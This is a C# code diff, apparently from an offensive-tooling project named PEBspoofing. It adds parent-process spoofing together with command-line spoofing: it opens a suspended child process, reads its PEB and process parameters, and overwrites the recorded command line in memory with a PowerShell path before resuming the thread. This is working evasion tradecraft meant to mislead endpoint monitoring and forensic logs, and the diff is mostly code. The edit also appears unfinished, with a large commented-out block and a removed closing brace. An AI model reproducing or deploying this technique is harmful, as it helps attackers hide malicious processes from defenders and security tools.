@@ -12,7 +12,7 @@ namespace PEBspoofing
     {
         public static PROCESS_INFORMATION PROCESS_INFORMATION_instance = new PROCESS_INFORMATION();
 
-        private static Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr CurrentHandle)
+        private static Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
         {
             IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
             RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));
@@ -21,7 +21,7 @@ namespace PEBspoofing
             bool return_status = false;
 
             return_status = NtReadVirtualMemory(
-                CurrentHandle,
+                Handle,
                 BaseAddress,
                 ObjAllocMemAddr,
                 (uint)Marshal.SizeOf(StructObject),
@@ -32,7 +32,7 @@ namespace PEBspoofing
             return StructObject;
         }
 
-        public static bool PPID_spoofing(int parentProcessId)
+        public static bool CreateProcessPPID_Spoofing(int parentProcessId)
         {
             //const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
             //const int CREATE_SUSPENDED = 0x00000004;
@@ -113,7 +113,8 @@ namespace PEBspoofing
                 );
 
                 PROCESS_INFORMATION_instance = pInfo;
-                
+                Commandline_Spoofing(parentProcessId, PROCESS_INFORMATION_instance);
+                ResumeThread(pInfo.hThread);
             }
             finally
             {
@@ -142,8 +143,61 @@ namespace PEBspoofing
 
         public static bool Commandline_Spoofing(int parentProcessId, PROCESS_INFORMATION PROCESS_INFORMATION_instance)
         {
-            
-            
+            PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new PROCESS_BASIC_INFORMATION();
+            IntPtr ProcessHandle = OpenProcess((uint)ProcessAccessFlags.All, false, PROCESS_INFORMATION_instance.dwProcessId);
+
+            uint sizePtr = 0;
+
+            UInt32 QueryResult = NtQueryInformationProcess(
+                ProcessHandle, 
+                0, 
+                ref PROCESS_BASIC_INFORMATION_instance, 
+                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance), 
+                ref sizePtr
+            );
+
+            PEB PEB_instance = new PEB();
+            PEB_instance = (PEB)FindObjectAddress(
+                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
+                PEB_instance,
+                ProcessHandle);
+           
+            RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS_instance = new RTL_USER_PROCESS_PARAMETERS();
+            RTL_USER_PROCESS_PARAMETERS_instance = (RTL_USER_PROCESS_PARAMETERS)FindObjectAddress(
+                PEB_instance.ProcessParameters64,
+                RTL_USER_PROCESS_PARAMETERS_instance,
+                ProcessHandle);
+
+            string cmdStr = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+            int cmdStr_Length = 2 * cmdStr.Length;
+            int cmdStr_MaximumLength = 2 * cmdStr.Length + 2;
+
+            IntPtr real_command_addr = IntPtr.Zero;
+            real_command_addr = Marshal.StringToHGlobalUni(cmdStr);
+
+            NTSTATUS ntstatus = new NTSTATUS();
+            int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.Length;
+            IntPtr com_zeroAddr = Marshal.AllocHGlobal(OriginalCommand_length);
+            RtlZeroMemory(com_zeroAddr, OriginalCommand_length);
+
+            // rewrite the memory with 0x00 and then write it with real command
+            ntstatus = NtWriteVirtualMemory(
+                ProcessHandle, 
+                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer, 
+                com_zeroAddr,
+                RTL_USER_PROCESS_PARAMETERS_instance.Length, 
+                ref sizePtr);
+           
+            ntstatus = NtWriteVirtualMemory(
+                ProcessHandle, 
+                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer, 
+                real_command_addr,
+                (uint)cmdStr_Length, 
+                ref sizePtr);
+
+
+
+            /*
             PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
             PEB PebBlock = new PEB();
             RTL_USER_PROCESS_PARAMETERS parameters = new RTL_USER_PROCESS_PARAMETERS();
@@ -212,12 +266,15 @@ namespace PEBspoofing
 
             // Console.WriteLine(GetCurrentThread());
             //ResumeThread(pInfo.hProcess);
-            ResumeThread(pInfo.hThread);
+            
+            */
             return true;
+            
+
             }
          
         }
 
 
-    }
+   
 }
